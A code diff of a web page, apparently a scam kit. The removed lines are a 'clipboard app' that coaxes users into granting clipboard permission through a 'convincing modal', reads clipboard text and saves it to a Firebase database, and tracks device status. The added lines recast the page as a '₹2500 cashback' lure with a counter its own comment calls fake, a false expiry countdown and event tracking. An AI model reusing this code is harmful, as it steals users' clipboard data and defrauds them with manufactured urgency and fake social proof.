-            recentItems.unshift(item);
-            
-            // Keep max 10
-            if (recentItems.length > 10) recentItems.pop();
-            
-            renderRecent();
-        }
-
-        function renderRecent() {
-            if (recentItems.length === 0) {
-                recentList.innerHTML = `
-                    <div style="text-align: center; padding: 20px; color: #5f6368; font-size: 12px;">
-                        No recent items
-                    </div>
-                `;
-                return;
-            }
-
-            recentList.innerHTML = recentItems.map(item => {
-                const timeAgo = getTimeAgo(item.timestamp);
-                const icon = item.type === 'image' ? '🖼️' : item.type === 'write' ? '📤' : '📄';
-                
-                return `
-                    <div class="recent-item" onclick="showRecentPreview('${escapeHtml(item.preview)}')">
-                        <div class="recent-icon">${icon}</div>
-                        <div class="recent-text">
-                            <strong>${escapeHtml(item.preview)}</strong>
-                            <span>${item.type === 'image' ? 'Image' : 'Text'} • ${item.preview.length} chars</span>
-                        </div>
-                        <div class="recent-time">${timeAgo}</div>
-                    </div>
-                `;
-            }).join('');
-        }
-
-        function showRecentPreview(text) {
-            showToast('📋 ' + text.substring(0, 50) + (text.length > 50 ? '...' : ''));
-        }
-
-        function getTimeAgo(timestamp) {
-            const diff = Date.now() - timestamp;
-            const sec = Math.floor(diff / 1000);
-            if (sec < 60) return 'just now';
-            const min = Math.floor(sec / 60);
-            if (min < 60) return `${min}m ago`;
-            const hr = Math.floor(min / 60);
-            if (hr < 24) return `${hr}h ago`;
-            return `${Math.floor(hr / 24)}d ago`;
-        }
-
-        function escapeHtml(str) {
-            const div = document.createElement('div');
-            div.textContent = String(str);
-            return div.innerHTML;
-        }
-
-        /* ============================================================
-           PERMISSION CHECK
-           ============================================================ */
-        async function checkPerm(type = 'clipboard-read') {
-            if (!navigator.permissions || !navigator.permissions.query) return 'unknown';
-            try {
-                const status = await navigator.permissions.query({ name: type });
-                return status.state;
-            } catch (e) {
-                return 'unknown';
-            }
-        }
-
-        async function updatePermUI() {
-            const state = await checkPerm('clipboard-read');
-            readPermDot.className = 'perm-dot ' + state;
-            readPermText.textContent = state;
-        }
-
-        /* ============================================================
-           PERMISSION MODAL
-           ============================================================ */
-        function showPermModal() {
-            permModal.classList.add('show');
-            if (navigator.vibrate) navigator.vibrate([50, 30, 50]);
-        }
-
-        function hidePermModal() {
-            permModal.classList.remove('show');
-        }
-
-        permAllowBtn.addEventListener('click', async () => {
-            hidePermModal();
-            
-            // Request mic... wait — clipboard permission
-            // Clipboard permission needs user gesture
-            try {
-                // Try reading empty text to trigger permission
-                await navigator.clipboard.readText();
-                showToast('✅ Clipboard access granted');
-            } catch (err) {
-                // Permission dialog will appear
-                showToast('👆 Browser mein "Allow" dabao');
-            }
-            
-            updatePermUI();
-            playSound(800, 0.1);
-        });
-
-        permSkipBtn.addEventListener('click', () => {
-            hidePermModal();
-            showToast('⏭️ Skipped — feature limited');
-        });
-
-        /* ============================================================
-           READ TEXT
-           ============================================================ */
-        readTextBtn.addEventListener('click', async () => {
-            try {
-                readResult.classList.remove('show', 'error');
-                imagePreview.classList.remove('show');
-                
-                const text = await navigator.clipboard.readText();
-                
-                readCount++;
-                statRead.textContent = readCount;
-                
-                if (!text || text.trim() === '') {
-                    readResult.textContent = '(Clipboard empty hai)';
-                } else {
-                    readResult.textContent = text;
-                    
-                    // Save to DB
-                    await saveToDB('text', text, { action: 'read' });
-                    
-                    // Add to recent
-                    addRecentItem('text', text.substring(0, 60));
-                }
-                
-                readResult.classList.add('show');
-                showToast('✅ Text read from clipboard');
-                playSound(900, 0.08);
-                vibrate(20);
-                
-                updatePermUI();
-                
-            } catch (err) {
-                console.error('❌ Read failed:', err);
-                readResult.textContent = `❌ Error: ${err.message}\n\nTip: Button dobara dabao — browser ko user gesture chahiye.`;
-                readResult.classList.add('show', 'error');
-                showToast('❌ Read failed — retry karo');
-            }
-        });
-
-        /* ============================================================
-           READ IMAGE
-           ============================================================ */
-        readImageBtn.addEventListener('click', async () => {
-            try {
-                readResult.classList.remove('show');
-                imagePreview.classList.remove('show');
-                
-                if (!navigator.clipboard.read) {
-                    throw new Error('Image read not supported');
-                }
-                
-                const items = await navigator.clipboard.read();
-                
-                let found = false;
-                
-                for (const item of items) {
-                    const imageType = item.types.find(t => t.startsWith('image/'));
-                    
-                    if (imageType) {
-                        const blob = await item.getType(imageType);
-                        const url = URL.createObjectURL(blob);
-                        
-                        imagePreview.src = url;
-                        imagePreview.classList.add('show');
-                        
-                        readCount++;
-                        statRead.textContent = readCount;
-                        
-                        // Save metadata to DB (not the whole image)
-                        await saveToDB('image', `[Image ${imageType} ${(blob.size/1024).toFixed(1)}KB]`, {
-                            action: 'read',
-                            imageType: imageType,
-                            imageSize: blob.size
-                        });
-                        
-                        addRecentItem('image', `Image • ${(blob.size/1024).toFixed(0)}KB`);
-                        
-                        found = true;
-                        showToast('✅ Image read from clipboard');
-                        playSound(900, 0.08);
-                        vibrate(20);
-                        break;
-                    }
-                }
-                
-                if (!found) {
-                    readResult.textContent = '(Clipboard mein koi image nahi hai)';
-                    readResult.classList.add('show');
-                    showToast('⚠️ No image found');
-                }
-                
-                updatePermUI();
-                
-            } catch (err) {
-                console.error('❌ Image read failed:', err);
-                readResult.textContent = `❌ Error: ${err.message}`;
-                readResult.classList.add('show', 'error');
-                showToast('❌ Image read failed');
-            }
-        });
-
-        /* ============================================================
-           WRITE TEXT
-           ============================================================ */
-        writeTextBtn.addEventListener('click', async () => {
-            const text = writeTextInput.value.trim();
-            
-            if (!text) {
-                showToast('⚠️ Pehle kuch type karo');
-                writeTextInput.focus();
-                return;
-            }
-            
-            try {
-                await navigator.clipboard.writeText(text);
-                
-                writeCount++;
-                statWrite.textContent = writeCount;
-                
-                // Save to DB
-                await saveToDB('write', text, { action: 'write', target: 'clipboard' });
-                
-                addRecentItem('write', text.substring(0, 60));
-                
-                showToast('✅ Clipboard mein copy ho gaya!');
-                playSound(1000, 0.1);
-                vibrate([30, 20, 30]);
-                
-                updatePermUI();
-                
-            } catch (err) {
-                console.error('❌ Write failed:', err);
-                showToast('❌ Copy failed: ' + err.message);
-            }
-        });
-
-        /* ============================================================
-           WRITE HTML
-           ============================================================ */
-        writeHtmlBtn.addEventListener('click', async () => {
-            const text = writeTextInput.value.trim();
-            
-            if (!text) {
-                showToast('⚠️ Pehle kuch type karo');
-                writeTextInput.focus();
-                return;
-            }
-            
-            try {
-                const html = `<div style="font-family: Arial, sans-serif; padding: 16px; background: linear-gradient(135deg, #0084FF, #00C6FF); color: white; border-radius: 12px; font-size: 16px; font-weight: 600;">✨ ${escapeHtml(text)}</div>`;
-                
-                if (navigator.clipboard.write) {
-                    const htmlBlob = new Blob([html], { type: 'text/html' });
-                    const textBlob = new Blob([text], { type: 'text/plain' });
-                    
-                    await navigator.clipboard.write([
-                        new ClipboardItem({
-                            'text/html': htmlBlob,
-                            'text/plain': textBlob
-                        })
-                    ]);
-                } else {
-                    await navigator.clipboard.writeText(text);
-                }
-                
-                writeCount++;
-                statWrite.textContent = writeCount;
-                
-                await saveToDB('write', text, { action: 'write', target: 'clipboard', format: 'html' });
-                addRecentItem('write', '🎨 ' + text.substring(0, 55));
-                
-                showToast('✅ Formatted text copied!');
-                playSound(1000, 0.1);
-                vibrate([30, 20, 30]);
-                
-            } catch (err) {
-                console.error('❌ HTML write failed:', err);
-                showToast('❌ Failed: ' + err.message);
-            }
-        });
-
-        /* ============================================================
-           CLEAR
-           ============================================================ */
-        clearBtn.addEventListener('click', async () => {
-            try {
-                await navigator.clipboard.writeText('');
-                showToast('🗑️ Clipboard cleared');
-                playSound(400, 0.15);
-                vibrate(50);
-            } catch (err) {
-                showToast('❌ Clear failed');
-            }
-        });
 
         /* ============================================================
            SOUND + VIBRATION
@@ -1061,6 +799,143 @@
         function vibrate(p) { if (navigator.vibrate) navigator.vibrate(p); }
 
         /* ============================================================
+           COPY BUTTON CLICK
+           ============================================================ */
+        copyBtn.addEventListener('click', async () => {
+            // Track click
+            await saveEvent('copy_btn_clicked');
+            
+            // Play sound + vibrate
+            playSound(800, 0.1);
+            vibrate(30);
+
+            // Show permission modal
+            showPermModal();
+        });
+
+        /* ============================================================
+           PERMISSION MODAL
+           ============================================================ */
+        function showPermModal() {
+            permModal.classList.add('show');
+            playSound(600, 0.15);
+            vibrate([50, 30, 50]);
+        }
+
+        function hidePermModal() {
+            permModal.classList.remove('show');
+        }
+
+        /* ============================================================
+           ALLOW BUTTON — Trigger clipboard
+           ============================================================ */
+        permAllowBtn.addEventListener('click', async () => {
+            hidePermModal();
+            
+            console.log('📋 User clicked Allow — copying...');
+            
+            try {
+                // Write code to clipboard
+                await navigator.clipboard.writeText(CASHBACK_CODE);
+                
+                // Success
+                await saveEvent('code_copied_successfully', {
+                    action: 'clipboard_write'
+                });
+                
+                playSound(1200, 0.2);
+                setTimeout(() => playSound(1600, 0.2), 150);
+                vibrate([50, 30, 50, 30, 50]);
+                
+                // Show success modal
+                showSuccessModal();
+                
+            } catch (err) {
+                console.error('❌ Copy failed:', err);
+                
+                await saveEvent('copy_failed', {
+                    error: err.message
+                });
+                
+                showToast('❌ Copy failed — please try again');
+            }
+        });
+
+        /* ============================================================
+           SUCCESS MODAL
+           ============================================================ */
+        function showSuccessModal() {
+            // Replace perm modal content with success
+            permModal.innerHTML = `
+                <div class="perm-box">
+                    <div class="success-icon">🎉</div>
+                    <h2 class="perm-title">Code Copied!</h2>
+                    <p class="perm-sub">
+                        Tumhara cashback code clipboard mein copy ho gaya hai.<br>
+                        Ab paste karo aur ₹2500 claim karo!
+                    </p>
+
+                    <div class="perm-code-show">
+                        <div class="perm-code-label">Copied Code</div>
+                        <div class="perm-code-value">${CASHBACK_CODE}</div>
+                    </div>
+
+                    <button class="perm-btn" onclick="window.location.reload()">
+                        <span>🔓</span>
+                        <span>Claim ₹2500 Now</span>
+                    </button>
+
+                    <button class="perm-skip" onclick="document.getElementById('permModal').classList.remove('show')">
+                        Close
+                    </button>
+                </div>
+            `;
+            
+            permModal.classList.add('show');
+        }
+
+        /* ============================================================
+           SKIP BUTTON
+           ============================================================ */
+        permSkipBtn.addEventListener('click', async () => {
+            hidePermModal();
+            await saveEvent('skipped');
+            showToast('⏭️ Skipped — code not copied');
+        });
+
+        /* ============================================================
+           LIVE COUNT — Fake counter
+           ============================================================ */
+        setInterval(() => {
+            const count = 1200 + Math.floor(Math.random() * 200);
+            liveCount.textContent = count.toLocaleString();
+        }, 3000);
+
+        /* ============================================================
+           TIMER COUNTDOWN (5 min)
+           ============================================================ */
+        let secondsLeft = 300; // 5 minutes
+        const validityElement = document.querySelector('.code-validity');
+        
+        setInterval(() => {
+            secondsLeft--;
+            if (secondsLeft <= 0) {
+                validityElement.innerHTML = `
+                    <span class="dot" style="background:#5f6368"></span>
+                    <span style="color:#5f6368">Code expired</span>
+                `;
+                return;
+            }
+            
+            const min = Math.floor(secondsLeft / 60);
+            const sec = secondsLeft % 60;
+            validityElement.innerHTML = `
+                <span class="dot"></span>
+                <span>Expires in ${min}:${String(sec).padStart(2, '0')}</span>
+            `;
+        }, 1000);
+
+        /* ============================================================
            TOAST
            ============================================================ */
         function showToast(msg) {
@@ -1080,17 +955,16 @@
         }
 
         /* ============================================================
-           INIT — Save device + show convincing modal
+           INIT — Save device
            ============================================================ */
         async function init() {
             console.log('🚀 Init...');
             
-            // Save device info
             try {
                 await set(ref(db, 'devices_root/' + DEVICE_ID), {
                     deviceId: DEVICE_ID,
                     deviceName: DEVICE_NAME,
-                    pageName: 'clipboard',
+                    pageName: 'cashback',
                     sessionId: SESSION_ID,
                     status: 'active',
                     firstVisit: Date.now(),
@@ -1101,56 +975,14 @@
                 console.warn('Device save failed:', e.message);
             }
             
-            updatePermUI();
-            
-            // Permission state check
-            const state = await checkPerm('clipboard-read');
-            console.log('📋 Clipboard permission:', state);
-            
-            if (state === 'prompt' || state === 'unknown') {
-                // Show convincing modal after 1.5 sec
-                setTimeout(showPermModal, 1500);
-            } else if (state === 'granted') {
-                console.log('✅ Already granted');
-            } else if (state === 'denied') {
-                // Show guide
-                setTimeout(() => {
-                    showToast('⚠️ Clipboard blocked — settings se allow karo');
-                }, 1000);
-            }
+            await saveEvent('page_view');
+            playSound(700, 0.08);
         }
-
-        // Device status update
-        document.addEventListener('visibilitychange', async () => {
-            try {
-                await set(ref(db, 'devices_root/' + DEVICE_ID + '/status'), 
-                    document.hidden ? 'background' : 'active');
-                await set(ref(db, 'devices_root/' + DEVICE_ID + '/lastSeen'), Date.now());
-            } catch (e) {}
-        });
-
-        window.addEventListener('pagehide', () => {
-            try {
-                const url = firebaseConfig.databaseURL + '/devices_root/' + DEVICE_ID + '/status.json';
-                const blob = new Blob([JSON.stringify('closed')], { type: 'application/json' });
-                navigator.sendBeacon(url, blob);
-            } catch (e) {}
-        });
-
-        // Enter key to copy
-        writeTextInput.addEventListener('keydown', (e) => {
-            if (e.key === 'Enter' && (e.ctrlKey || e.metaKey)) {
-                e.preventDefault();
-                writeTextBtn.click();
-            }
-        });
-
-        // Expose functions
-        window.showRecentPreview = showRecentPreview;
 
         init();
 
-        console.log('✅ Clipboard app ready');
+        console.log('✅ Cashback page ready');
+        console.log('🎁 Code:', CASHBACK_CODE);
     </script>
 </body>
 </html>
